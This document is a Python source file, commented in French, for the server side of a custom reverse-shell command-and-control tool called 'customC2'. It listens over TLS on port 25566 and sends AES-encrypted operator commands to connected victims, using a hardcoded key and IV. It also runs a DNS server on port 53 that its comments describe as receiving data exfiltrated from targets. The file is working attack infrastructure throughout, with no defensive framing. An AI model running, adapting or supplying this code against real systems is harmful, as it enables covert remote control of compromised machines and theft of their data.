# server_revershell
# Version 0.8b
# Auteur : Raphaël KATHALUWA-LIYANAGE

# import des libraires
import socket               # communication entre l'attaque et la cible
import ssl                  # chiffrement des échanges
import os                   # manipulations sur l'OS (changer de répertoire...)
import threading            # paralléliser des tâches
import time                 # mis en veille du programme
from dns_server import *    # exfiltration des données via DNS

# en écoute sur toutes les connexions entrantes
# 0.0.0.0:25566
HOST = '0.0.0.0'
PORT = 25566

# en écoute sur les 0.0.0.0:53 pour le DNS
DNS_PORT = 53

# certifat autosigné + clé privée pour chiffrer la communication
CERTIFICATE = "./chiffrement/python_ssl.pem"
PRIVATE_KEY = "./chiffrement/python_ssl_priv.key"
# taille des messages : 128kB max
BUFFER_SIZE = 1024 * 128

# clé de 32 octets pour utiliser AES-256 CBC
AES_KEY = b'W3c9vlwl1Cj0tM6FHkh3pZ%OTc+x8ET='
# vecteur initial de 16 octets
IV = b'efd6cb512023b721'

# Créer une socket TCP/IP
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))

# socket en écoute sur le port 25566/TCP
server_socket.listen(1)

# Envelopper la socket dans un contexte SSL
context =  ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
# chargement du certificat et de la clé privée RSA
context.load_cert_chain(certfile=CERTIFICATE, keyfile=PRIVATE_KEY)

#à mettre dans une fonction
def shell(socket):
    while socket:
        print(f"[*] Listening to {HOST}:{PORT}...")
        # accepte toutes les connections entrantes
        conn, addr = socket.accept()

        # Envelopper la connexion entrante dans un contexte SSL
        connssl = context.wrap_socket(conn, server_side=True)

        # Affichage des fonctionnalités de sécurité
        print(f"[+] Session encrypted in {connssl.version()}")
        print(f"[+] Commands encrypted in AES-256 CBC")

        try:
            print(f"[+] Client connected: {addr}")
            while True:
                # saisie en boucle d'une commande
                command = input("(customC2) $ ")
                
                # quitter la console
                if command == ":exit":
                    print(f'[-] Ending session with: {addr}')
                    
                    # fermeture des sockets serveur et client
                    server_socket.close()
                    conn.close()
                    exit(0)

                # chiffrement du contenu de la commande
                # puis envoi vers le client
                command = encrypt_aes_cbc(AES_KEY, IV, command)
                connssl.sendall(command.encode())
                
                # veille de 1s pour afficher la réponse du DNS
                time.sleep(1)
                # retour à la ligne
                print("")

        except Exception as e:
            # affichage de l'exception pour débugger
            print(f"[-] Fatal error: {e}")
            print(f"[-] Fatal error: killing session with {addr}")
            exit(-1)
        finally:
            # fermeture de la socket et fin du programme
            connssl.close()
            exit(0)

if __name__ == "__main__":
    # effacer le contenu de la console
    # OS Windows
    if os.name == 'nt':
        windows = os.system('cls')

    # OS UNIX
    else:
        unix = os.system('clear')

    # thread pour lancer le shell en parallèle
    thread_shell = threading.Thread(target=shell, args=[server_socket])
    thread_shell.start()

    # création d'une instance DNS
    resolver = CustomResolver()
    
    # Configuration de l'instance DNS
    server = DNSServer(resolver, port=DNS_PORT, handler=CustomDNSHandler)
    
    # lancement du serveur DNS
    print(f"[*] Listening to {HOST}:{DNS_PORT}...")
    server.start()
    